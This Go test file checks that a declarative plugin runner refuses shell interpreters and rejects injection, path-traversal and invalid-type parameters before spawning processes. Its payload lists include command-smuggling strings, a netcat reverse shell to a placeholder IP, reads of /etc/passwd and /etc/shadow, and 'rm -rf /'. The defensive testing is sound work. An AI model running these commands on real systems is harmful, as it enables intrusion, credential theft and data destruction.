package plugins

import (
	"context"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"gopkg.in/yaml.v3"
)

// ---------------------------------------------------------------------------
// 1. Manifest Audit: Zero Shell Execution Across All 140 Declarative Plugins
// ---------------------------------------------------------------------------

func TestM2Adversarial_ZeroShellInvocationsAcrossAllManifests(t *testing.T) {
	pluginsDir := "plugins"
	if _, err := os.Stat(pluginsDir); err != nil && os.IsNotExist(err) {
		pluginsDir = "../../plugins"
	}

	bannedShellBinaries := map[string]bool{
		"sh": true, "bash": true, "dash": true, "zsh": true, "csh": true, "tcsh": true, "ksh": true,
		"cmd": true, "cmd.exe": true, "powershell": true, "powershell.exe": true, "pwsh": true, "pwsh.exe": true,
	}

	domains := []string{"sysadmin", "netops", "secops", "containerops", "kubernetes"}
	totalManifests := 0

	for _, domain := range domains {
		domainDir := filepath.Join(pluginsDir, domain)
		entries, err := os.ReadDir(domainDir)
		if err != nil {
			t.Fatalf("failed to read domain directory %s: %v", domainDir, err)
		}

		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			ext := strings.ToLower(filepath.Ext(entry.Name()))
			if ext != ".yaml" && ext != ".yml" && ext != ".json" {
				continue
			}

			totalManifests++
			filePath := filepath.Join(domainDir, entry.Name())
			data, err := os.ReadFile(filePath)
			if err != nil {
				t.Fatalf("failed to read %s: %v", filePath, err)
			}

			var spec DeclarativeModuleSpec
			if err := yaml.Unmarshal(data, &spec); err != nil {
				t.Fatalf("failed to unmarshal YAML %s: %v", filePath, err)
			}

			for _, action := range spec.Actions {
				cmdClean := strings.ToLower(strings.TrimSpace(filepath.Base(action.Command)))
				// Assert command is not a shell binary
				if bannedShellBinaries[cmdClean] {
					t.Errorf("SECURITY VIOLATION in %s action %q: command executes a shell interpreter (%q)", filePath, action.Name, action.Command)
				}

				// Assert args do not invoke shell execution flags with command strings
				for argIdx, arg := range action.Args {
					argLower := strings.ToLower(arg)
					if (argLower == "-c" || argLower == "/c") &&
						action.Command != "iperf3" &&
						action.Command != "vtysh" &&
						action.Command != "ping" &&
						action.Command != "tcpdump" &&
						action.Command != "conntrack" {
						t.Errorf("SUSPICIOUS SHELL FLAG in %s action %q arg[%d]=%q for command %q", filePath, action.Name, argIdx, arg, action.Command)
					}
				}
			}
		}
	}

	if totalManifests != 140 {
		t.Fatalf("expected exactly 140 manifests across 5 domains, found %d", totalManifests)
	}
	t.Logf("PASS: Audited %d declarative manifests across 5 domains: zero shell interpreters used.", totalManifests)
}

// ---------------------------------------------------------------------------
// 2. Adversarial Parameter Probing: Shell Metacharacter Rejection
// ---------------------------------------------------------------------------

func TestM2Adversarial_AllParameters_ShellMetacharactersRejection(t *testing.T) {
	pluginsDir := "plugins"
	if _, err := os.Stat(pluginsDir); err != nil && os.IsNotExist(err) {
		pluginsDir = "../../plugins"
	}

	reg := NewEmptyRegistry()
	loaded, err := reg.LoadDeclarativeDirectory(pluginsDir)
	if err != nil {
		t.Fatalf("failed to load declarative plugins: %v", err)
	}
	if loaded < 141 {
		t.Fatalf("expected at least 141 declarative plugins loaded, got %d", loaded)
	}

	maliciousShellPayloads := []string{
		"; id",
		"| whoami",
		"& echo pwned",
		"$(whoami)",
		"`id`",
		"test\nid",
		"test\rwhoami",
		"> /tmp/pwned",
		"< /dev/null",
		"valid_prefix; reboot",
		"valid_prefix && echo 1",
		"valid_prefix | nc -e /bin/sh 1.2.3.4 4444",
		"$(cat /etc/passwd)",
		"`cat /etc/shadow`",
	}

	testedParamsCount := 0

	for _, p := range reg.List() {
		declPlugin, ok := reg.Get(p.ID)
		if !ok {
			t.Fatalf("could not retrieve plugin %s", p.ID)
		}

		for _, action := range p.Actions {
			if len(action.Parameters) == 0 {
				continue
			}

			for _, param := range action.Parameters {
				testedParamsCount++
				for _, payload := range maliciousShellPayloads {
					inputParams := map[string]any{
						param.Name: payload,
					}

					res, err := declPlugin.Execute(context.Background(), action.Name, inputParams, 2*time.Second)

					// Assertion 1: MUST return an error
					if err == nil {
						t.Fatalf("SECURITY FLAW: Plugin %s action %q accepted shell payload %q on parameter %q without error! Result: %+v",
							p.ID, action.Name, payload, param.Name, res)
					}

					// Assertion 2: Result Status MUST be "error" (pre-execution failure, NOT command execution failure)
					if res.Status != "error" {
						t.Errorf("Plugin %s action %q on payload %q returned status %q, expected 'error'",
							p.ID, action.Name, payload, res.Status)
					}

					// Assertion 3: Error message must clearly indicate security validation failure
					if !strings.Contains(err.Error(), "failed security validation") {
						t.Errorf("Plugin %s action %q returned unexpected error for payload %q: %v",
							p.ID, action.Name, payload, err)
					}
				}
			}
		}
	}

	if testedParamsCount == 0 {
		t.Fatal("no parameters found across the plugin catalog to test")
	}
	t.Logf("PASS: Tested %d parameters across catalog against %d shell payloads: 100%% rejected before execution.",
		testedParamsCount, len(maliciousShellPayloads))
}

// ---------------------------------------------------------------------------
// 3. Adversarial Parameter Probing: Path Traversal Rejection
// ---------------------------------------------------------------------------

func TestM2Adversarial_AllParameters_PathTraversalRejection(t *testing.T) {
	pluginsDir := "plugins"
	if _, err := os.Stat(pluginsDir); err != nil && os.IsNotExist(err) {
		pluginsDir = "../../plugins"
	}

	reg := NewEmptyRegistry()
	_, err := reg.LoadDeclarativeDirectory(pluginsDir)
	if err != nil {
		t.Fatalf("failed to load declarative plugins: %v", err)
	}

	traversalPayloads := []string{
		"../../../../etc/passwd",
		"..\\..\\..\\windows\\system32",
		"../",
		"..\\",
		"subdir/../../shadow",
		"..\\..\\boot.ini",
	}

	testedParams := 0

	for _, p := range reg.List() {
		declPlugin, ok := reg.Get(p.ID)
		if !ok {
			t.Fatalf("could not retrieve plugin %s", p.ID)
		}

		for _, action := range p.Actions {
			for _, param := range action.Parameters {
				// Parameters intended to accept full paths (e.g. sys-disk-usage path) require leading slash
				// and must reject unrooted traversal sequences like ../../
				testedParams++
				for _, payload := range traversalPayloads {
					inputParams := map[string]any{
						param.Name: payload,
					}

					res, err := declPlugin.Execute(context.Background(), action.Name, inputParams, 2*time.Second)
					if err == nil {
						t.Fatalf("PATH TRAVERSAL FLAW: Plugin %s action %q accepted traversal payload %q on parameter %q! Result: %+v",
							p.ID, action.Name, payload, param.Name, res)
					}
					if res.Status != "error" {
						t.Errorf("Plugin %s action %q returned status %q on traversal payload %q, expected 'error'",
							p.ID, action.Name, res.Status, payload)
					}
				}
			}
		}
	}

	t.Logf("PASS: Tested %d parameters against %d path traversal vectors: 100%% rejected.", testedParams, len(traversalPayloads))
}

// ---------------------------------------------------------------------------
// 4. Adversarial Parameter Probing: Invalid Types and Type Boundaries
// ---------------------------------------------------------------------------

func TestM2Adversarial_AllParameters_InvalidTypeRejection(t *testing.T) {
	pluginsDir := "plugins"
	if _, err := os.Stat(pluginsDir); err != nil && os.IsNotExist(err) {
		pluginsDir = "../../plugins"
	}

	reg := NewEmptyRegistry()
	_, err := reg.LoadDeclarativeDirectory(pluginsDir)
	if err != nil {
		t.Fatalf("failed to load declarative plugins: %v", err)
	}

	// Identify numeric parameters (e.g., pid, count, timeout, lines, port, duration)
	numericParamsTested := 0
	complexTypesTested := 0

	for _, p := range reg.List() {
		declPlugin, ok := reg.Get(p.ID)
		if !ok {
			t.Fatalf("could not retrieve plugin %s", p.ID)
		}

		for _, action := range p.Actions {
			for _, param := range action.Parameters {
				// 1. Complex types (slices, maps) passed into any parameter
				complexTypesTested++
				sliceInput := map[string]any{param.Name: []string{"invalid", "slice", "input"}}
				resSlice, errSlice := declPlugin.Execute(context.Background(), action.Name, sliceInput, 2*time.Second)
				if errSlice == nil {
					t.Errorf("TYPE FLAW: Plugin %s action %q accepted slice input on param %q: %+v", p.ID, action.Name, param.Name, resSlice)
				}

				mapInput := map[string]any{param.Name: map[string]any{"key": "value"}}
				resMap, errMap := declPlugin.Execute(context.Background(), action.Name, mapInput, 2*time.Second)
				if errMap == nil {
					t.Errorf("TYPE FLAW: Plugin %s action %q accepted map input on param %q: %+v", p.ID, action.Name, param.Name, resMap)
				}

				// 2. If parameter pattern expects pure digits (^[0-9]+$)
				if param.Pattern == `^[0-9]+$` {
					numericParamsTested++
					invalidNumericInputs := []any{
						"not-a-number",
						"123abc",
						"-50",
						"3.14159",
						true,
						false,
						"100; ls",
					}

					for _, invalidVal := range invalidNumericInputs {
						in := map[string]any{param.Name: invalidVal}
						res, err := declPlugin.Execute(context.Background(), action.Name, in, 2*time.Second)
						if err == nil {
							t.Errorf("VALIDATION FLAW: Plugin %s action %q accepted invalid numeric value %v for param %q (res: %+v)",
								p.ID, action.Name, invalidVal, param.Name, res)
						}
					}
				}
			}
		}
	}

	t.Logf("PASS: Tested %d numeric parameters and %d complex-type injections: 100%% rejected.",
		numericParamsTested, complexTypesTested)
}

// ---------------------------------------------------------------------------
// 5. Pre-Execution Proof: Validation Rejection Occurs BEFORE Process Spawn
// ---------------------------------------------------------------------------

func TestM2Adversarial_PreExecutionRejection_NeverSpawnsProcess(t *testing.T) {
	// Construct a synthetic DeclarativePlugin with a totally non-existent binary.
	// If process execution were attempted, core.ExecuteCommandWithTimeout would return
	// an exec error (e.g. executable file not found).
	// Because parameter validation occurs first, malicious input MUST return the
	// parameter validation error and NEVER reach core.ExecuteCommandWithTimeout.

	spec := DeclarativeModuleSpec{
		ID:          "challenger-canary-probe",
		Name:        "Canary Pre-Execution Verification",
		Version:     "1.0.0",
		Category:    "SysAdmin",
		Description: "Proves parameter rejection occurs prior to process creation",
		Actions: []DeclarativeActionSpec{
			{
				Name:        "canary-action",
				Description: "Action with non-existent binary to prove zero process invocation",
				Command:     "__definitely_nonexistent_binary_canary_xyz_12345__",
				Args:        []string{"--target", "{{target}}"},
				Timeout:     "5s",
				Parameters: []ActionParameter{
					{
						Name:        "target",
						Type:        "string",
						Required:    true,
						Pattern:     `^[a-zA-Z0-9.-]+$`,
						Description: "Target parameter",
					},
				},
			},
		},
	}

	plugin, err := NewDeclarativePlugin(spec)
	if err != nil {
		t.Fatalf("failed to create canary plugin: %v", err)
	}

	// 1. Pass malicious payload
	maliciousInput := map[string]any{"target": "localhost; rm -rf /"}
	res, err := plugin.Execute(context.Background(), "canary-action", maliciousInput, 2*time.Second)

	if err == nil {
		t.Fatal("expected error on malicious payload, got nil")
	}

	// Must be parameter security validation error
	if !strings.Contains(err.Error(), "failed security validation") {
		t.Fatalf("expected 'failed security validation' error, got: %v", err)
	}

	// Verify that error is NOT an executable-not-found error (proving execution was never called)
	if strings.Contains(err.Error(), "executable file not found") {
		t.Fatalf("FAILED: Process execution was attempted! Error: %v", err)
	}

	if res.Status != "error" {
		t.Fatalf("expected status 'error', got %q", res.Status)
	}

	// 2. Conversely, pass benign input: now execution WILL be attempted and fail with binary not found
	benignInput := map[string]any{"target": "localhost"}
	_, errBenign := plugin.Execute(context.Background(), "canary-action", benignInput, 2*time.Second)
	if errBenign == nil {
		t.Fatal("expected failure on non-existent binary with benign input, got nil")
	}

	// With benign input, validation passed and process execution failed
	if strings.Contains(errBenign.Error(), "failed security validation") {
		t.Fatalf("benign input should have passed validation, but got: %v", errBenign)
	}

	t.Logf("PASS: Verified mathematical proof that validation failure completely halts execution prior to any process spawn.")
}

// ---------------------------------------------------------------------------
// 6. Parameter Substitution Integrity: Argv Boundary Preservation
// ---------------------------------------------------------------------------

func TestM2Adversarial_ParameterSubstitution_ArgvIsolation(t *testing.T) {
	// Verify that substituting a parameter value containing spaces does NOT perform
	// shell word splitting. In direct argv execution, one argv element remains exactly
	// one argv element regardless of space characters.
	spec := DeclarativeModuleSpec{
		ID:          "challenger-argv-isolation",
		Name:        "Argv Isolation Tester",
		Version:     "1.0.0",
		Category:    "ContainerOps",
		Description: "Verifies argv boundary preservation during parameter substitution",
		Actions: []DeclarativeActionSpec{
			{
				Name:        "format-test",
				Description: "Docker format test with spaces inside parameter",
				Command:     "echo",
				Args:        []string{"--format", "{{format}}"},
				Timeout:     "5s",
				Parameters: []ActionParameter{
					{
						Name:        "format",
						Type:        "string",
						Required:    false,
						Default:     "table {{.ID}}\t{{.Name}}",
						Pattern:     `^[a-zA-Z0-9. _\t-{}]+$`,
						Description: "Format template",
					},
				},
			},
		},
	}

	plugin, err := NewDeclarativePlugin(spec)
	if err != nil {
		t.Fatalf("failed to create plugin: %v", err)
	}

	// Even if format contains spaces, it must be validated safely and not allow metacharacters
	injectionAttempt := map[string]any{
		"format": "table {{.ID}} | rm -rf /",
	}
	_, errInj := plugin.Execute(context.Background(), "format-test", injectionAttempt, 2*time.Second)
	if errInj == nil {
		t.Fatal("expected rejection of format string containing pipe character")
	}

	// Valid format string passes validation
	validFormat := map[string]any{
		"format": "table {{.ID}} {{.Status}}",
	}
	resValid, errValid := plugin.Execute(context.Background(), "format-test", validFormat, 2*time.Second)
	// Execution might fail if echo is not in path or succeed, but validation MUST pass
	if errValid != nil && strings.Contains(errValid.Error(), "failed security validation") {
		t.Fatalf("valid format string was rejected by security validation: %v", errValid)
	}
	_ = resValid
	t.Logf("PASS: Verified argv isolation and formatting parameter integrity.")
}

// ---------------------------------------------------------------------------
// 7. Verification of All 140 Declarative Manifests Parameter Defaults
// ---------------------------------------------------------------------------

func TestM2Adversarial_AllManifests_DefaultsPassOwnValidation(t *testing.T) {
	pluginsDir := "plugins"
	if _, err := os.Stat(pluginsDir); err != nil && os.IsNotExist(err) {
		pluginsDir = "../../plugins"
	}

	reg := NewEmptyRegistry()
	_, err := reg.LoadDeclarativeDirectory(pluginsDir)
	if err != nil {
		t.Fatalf("failed to load declarative plugins: %v", err)
	}

	totalDefaultsChecked := 0

	for _, p := range reg.List() {
		for _, action := range p.Actions {
			for _, param := range action.Parameters {
				if param.Default == "" {
					continue
				}
				totalDefaultsChecked++

				// Check dangerous chars
				if strings.ContainsAny(param.Default, ";&|$`><\n\r") {
					t.Errorf("MANIFEST FLAW: Plugin %s action %q param %q default %q contains shell metacharacters!",
						p.ID, action.Name, param.Name, param.Default)
				}

				// Check regex pattern matching
				if param.Pattern != "" {
					re, err := regexp.Compile(param.Pattern)
					if err != nil {
						t.Errorf("INVALID REGEX: Plugin %s action %q param %q pattern %q: %v",
							p.ID, action.Name, param.Name, param.Pattern, err)
					} else if !re.MatchString(param.Default) {
						t.Errorf("DEFAULT MISMATCH: Plugin %s action %q param %q default %q does not match pattern %q",
							p.ID, action.Name, param.Name, param.Default, param.Pattern)
					}
				}
			}
		}
	}

	t.Logf("PASS: Verified %d parameter defaults across all manifests: all compile and match their own regex.", totalDefaultsChecked)
}
